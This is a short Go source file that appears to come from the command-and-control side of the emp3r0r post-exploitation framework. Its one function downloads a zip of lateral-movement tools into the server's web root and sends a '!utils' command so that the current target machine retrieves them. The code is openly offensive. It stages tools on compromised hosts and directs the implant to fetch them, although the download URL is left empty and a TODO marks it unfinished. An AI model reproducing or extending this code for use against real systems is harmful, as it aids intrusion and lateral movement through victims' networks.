package cc

import "github.com/jm33-m0/emp3r0r/core/internal/agent"

// TODO host static binaries
var UtilsURL = ""

// upload a zip file that packs several lateral-movement tools
// statically linked, built under alpine
func moduleUtils() {
	if !agent.IsFileExist("utils.zip") {
		CliPrintError("[*] utils.zip not found, downloading from " + UtilsURL)

		if err := agent.Download(UtilsURL, WWWRoot+"utils.zip"); err != nil {
			CliPrintError("[*] utils.zip could not be downloaded: %v", err)
		}
	}

	err := SendCmd("!utils", CurrentTarget)
	if err != nil {
		CliPrintError("[-] SendCmd failed: %v", err)
	}
}
